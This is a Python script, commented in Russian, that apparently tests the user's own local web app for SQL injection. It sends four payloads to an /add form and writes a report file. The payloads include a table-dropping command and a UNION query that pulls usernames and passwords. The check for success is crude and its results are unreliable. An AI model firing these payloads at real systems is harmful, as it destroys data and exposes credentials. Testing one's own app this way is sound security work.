import requests
import os
from datetime import datetime

# Устанавливаем базовый URL вашего сервера
base_url = 'http://127.0.0.1:5000'

# Список полезных нагрузок для тестирования SQL-инъекций
payloads = [
    "' OR '1'='1",  # Простая инъекция для обхода проверки
    "'; DROP TABLE user; --",  # Вредоносный запрос для удаления таблицы
    "'; SELECT * FROM user; --",  # Запрос для получения всех данных из таблицы
    "' UNION SELECT null, username, password FROM user --",  # Попытка извлечь данные из таблицы user
]

# Функция для тестирования SQL-инъекций
def test_sql_injection(payload):
    """
    Тестирует SQL-инъекцию с указанной полезной нагрузкой.
    """
    data = {
        'username': payload,
        'email': 'test@example.com',
    }

    try:
        response = requests.post(f'{base_url}/add', data=data, timeout=10)
        vulnerable = "error" not in response.text.lower() and response.status_code == 200
        return {
            "payload": payload,
            "vulnerable": vulnerable,
            "response_code": response.status_code,
        }
    except requests.exceptions.RequestException as e:
        return {
            "payload": payload,
            "vulnerable": False,
            "error": str(e),
        }

# Генерация отчета
def generate_report():
    """
    Генерирует отчет о тестировании SQL-инъекций.
    """
    # Проверяем, существует ли папка для отчетов, и создаем, если ее нет
    report_dir = "Отчеты"
    os.makedirs(report_dir, exist_ok=True)

    total_tests = 0
    total_vulnerabilities = 0
    report_lines = []

    # Заголовок отчета
    report_lines.append("Отчет о тестировании SQL инъекций")
    report_lines.append("=" * 40)
    report_lines.append(f"Дата проверки: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    report_lines.append("")

    # Тестирование
    for payload in payloads:
        total_tests += 1
        print(f"Тестирование с полезной нагрузкой: {payload}")  # Логирование процесса
        result = test_sql_injection(payload)

        if result.get("vulnerable"):
            total_vulnerabilities += 1
            print("[+] Уязвимость обнаружена.")
            report_lines.append(f"Полезная нагрузка: {result['payload']}")
            report_lines.append("")
        else:
            print("[-] Уязвимость не обнаружена.")
            report_lines.append(f"Полезная нагрузка: {result['payload']}")
            if result.get("error"):
                report_lines.append(f"Ошибка: {result['error']}")
            else:
                report_lines.append("Ответ сервера: Уязвимость не обнаружена.")
            report_lines.append("")

    report_lines.append("=" * 40)
    report_lines.append(f"Всего тестов: {total_tests}")
    report_lines.append(f"Обнаружено уязвимостей: {total_vulnerabilities}")

    # Путь к файлу отчета
    report_file_path = os.path.join(report_dir, 'SQL_Отчет.txt')

    # Запись отчета в файл
    with open(report_file_path, 'w', encoding='utf-8') as report_file:
        report_file.write("\n".join(report_lines))

    print(f"[INFO] Отчет сохранен в: {report_file_path}")

# Запуск тестирования и генерации отчета
if __name__ == "__main__":
    generate_report()
